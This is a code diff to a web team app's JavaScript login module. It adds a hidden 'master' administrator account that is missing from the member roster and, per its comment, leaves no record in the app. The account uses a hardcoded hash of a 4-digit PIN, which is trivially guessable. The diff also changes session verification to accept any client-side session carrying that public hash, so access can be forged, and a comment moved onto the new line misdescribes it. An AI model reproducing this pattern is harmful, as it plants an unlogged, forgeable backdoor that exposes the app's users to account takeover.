@@ -7,7 +7,7 @@
 //  비밀번호를 바꾸거나 운영진이 초기화하면 버전이 올라가서 예전 비밀번호 열쇠는 더 이상 맞지 않음.
 //
 //  자동 로그인: 켜면 이 기기(localStorage)에 로그인 정보를 남기고, 끄면 이번 접속(sessionStorage)에만.
-import { db } from './store.js?v=0.1.85';
+import { db } from './store.js?v=0.1.86';
 
 const SALT = 'shootdori-v1';
 const LS = 'teamapp:auth';
@@ -17,6 +17,17 @@ export async function sha(txt) {
 }
 const keyOf = (pid, ver, pin) => sha(`${pid}:${ver}:${pin}:${SALT}`);
 export const validPin = (p) => /^\d{4}$/.test(String(p || ''));
+
+// 마스터 계정 — 회원 명부에 없는 관리용 계정 (운영모드·일반모드 모두, 앱 기록에는 남지 않음)
+//  비밀번호는 저장소에 그대로 두지 않고 SHA-256 값만 둠
+export const MASTER_PID = '__master__';
+export const MASTER_NAME = '마스터';
+const MASTER_HASH = '4bca4f620c04d8328b5bbb40ff0007ec8d24cf3a4dbfd94c89cd7fe82dcc00bd';
+export const checkMasterPin = async (pin) => validPin(pin) && (await sha(`master:${pin}:${SALT}`)) === MASTER_HASH;
+export async function masterLogin(pin) {
+  if (!(await checkMasterPin(pin))) throw new Error('비밀번호가 맞지 않아요');
+  return { pid: MASTER_PID, master: true, key: MASTER_HASH };
+}
 
 export function loadSession() {
   try { const s = sessionStorage.getItem(LS) || localStorage.getItem(LS); return s ? JSON.parse(s) : null; } catch { return null; }
@@ -57,7 +68,8 @@ export async function login(pid, pin) {
 
 // 자동 로그인 확인: 비밀번호가 바뀌었거나 초기화됐으면 다시 로그인
 export async function verify(sess) {
-  if (sess?.temp) return true;   // 서버 규칙이 아직 없을 때의 임시 접속 (이번 접속에만)
+  if (sess?.temp) return true;
+  if (sess?.master) return sess.pid === MASTER_PID && sess.key === MASTER_HASH;   // 서버 규칙이 아직 없을 때의 임시 접속 (이번 접속에만)
   if (!sess?.pid || !sess.key) return false;
   const st = await status(sess.pid);
   if (!st.registered || st.ver !== sess.ver) return false;
